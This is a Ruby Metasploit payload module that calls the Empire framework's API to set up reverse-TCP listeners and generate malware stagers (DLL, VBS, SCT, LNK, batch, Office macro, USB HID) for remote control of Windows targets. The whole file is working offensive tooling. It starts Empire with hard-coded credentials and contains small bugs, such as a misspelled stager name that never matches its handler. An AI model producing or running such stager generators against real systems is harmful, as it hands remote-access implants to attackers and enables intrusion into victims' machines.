# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see theMetasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
require 'msf/core/handler/empire_reverse_tcp.rb'
require 'msf/core/module/data_store'
require 'msf/core/module/options'
require 'msf/core/empire_lib.rb'

module MetasploitModule
  include Msf::Empire
  include Msf::Module::Options
  include Msf::Module::DataStore
  include Msf::Payload::Stager
  def initialize(info={})
    super(merge_info(info,
    'Name'       => 'Empire Stager Module',
    'Description'=> 'This creates a standalone stager for Empire using the Rest-API',
    'Author'     => ['author_name'],
    'License'    => MSF_LICENSE,
    'Platform'   => ['Windows', 'Linux', 'MacOS'],
    'Arch'       => ARCH_X86,
    'Handler'    => Msf::Handler::EmpireReverseTcp
    ))
    register_options(
      [OptAddress.new(
        'LHOST',
        [true,
        'The local address to lisen on'
        ]),
      OptPort.new(
        'LPORT',
        [true,
        'The local port to listen on'
        ]),
      OptString.new(
        'ListenerName',
        [true,
        'The empire listener name that would listen for the created stager on the local system',
        ]),
      OptEnum.new(
        'StagerType',
        [true,
        'The type of stager to be generated',
        enums: ['windows/dll', 'windows/ducky', 'windows/launcher_sct', 'windows/laucher_vbs', 'windows/launcher_xml', 'windows/teensy', 'windows/launcher_bat', 'windows/launcher_lnk', 'windows/macro' ]]),
      OptString.new(
        'PathToEmpire',
        [true,
        'The complete path to Empire-WEB API',
        '/'])
    ])
  end
  def payload_name(stager)
    @rand_no = rand(1..10000)
    case stager
      when "windows/dll"
        return "/tmp/launcher#{@rand_no}.dll"
      when "windows/launcher_bat"
        return "/tmp/launcher#{@rand_no}.bat"
      when "windows/launcher_vbs"
        return "/tmp/launcher#{@rand_no}.vbs"
      when "windows/launcher_sct"
        return "/tmp/launcher#{@rand_no}.sct"
      when "windows/launcher_lnk"
        return "/tmp/launcher#{@rand_no}.lnk"
      when "windows/launcher_xml"
        return "/tmp/launcher#{@rand_no}.xml"
      when "windows/teensy"
        return "/tmp/launcher#{@rand_no}.ino"
      when "windows/macro"
        return "/tmp/macro#{@rand_no}.txt"
      when "multi/pyinstaller"
        return "/tmp/launcher#{@rand_no}.elf"
      when "multi/war"
        return "/tmp/launcher#{@rand_no}.war"
    end
  end

  def generate
    #
    #Storing data from user
    #
    @host = datastore['LHOST'].to_s
    @port = datastore['LPORT'].to_s
    @listener_name = datastore['ListenerName'].to_s
    @stager_type = datastore['StagerType'].to_s
    @path = datastore['PathToEmpire'].to_s.chomp
    Dir.chdir(@path)
    def thread_API
      #
      #Initiating the Empire API Instance thread
      #
      if not File.file?('empire.sh')
        return ""
      end
      command = "./empire.sh --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
      print_status("Initiating Empire Web-API")
      value = system(command)
    end

    def main
      #Check port
      command = "netstat -nlt | grep 1337"
      if not system(command)
        return ""
      end
      #Creating an Empire object
      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
      #Checking listener status
      response = client_emp.is_listener_active(@listener_name)
      if response == false
        responseListener = client_emp.create_listener(@listener_name, @port, @host)
        raise responseListener.to_s if responseListener.to_s.include?("Failed")
        print_status(responseListener.to_s)
      else
        print_status(response)
      end

      #Creating the stager
      payload_path = payload_name(@stager_type)

      #Generating payload
      if @stager_type == "windows/dll"
        print_status(client_emp.generate_dll(@listener_name, payload_path, 'x64', @path))
      else
        print_status(client_emp.gen_stager(@listener_name, @stager_type, payload_path))
      end

      #Shutting down API
      client_emp.shutdown()

      #Showing user the respective listener name to use while handling for
      #reverse connections
      print_status("Use Listener : #{@listener_name} to listen for the created stager")

    end

    #Commencing the threads
    thread_api = Thread.new{
      thread_API()
    }
    thread_main = Thread.new{
      main()
    }

    #Joining the main thread
    thread_main.join
  end
end
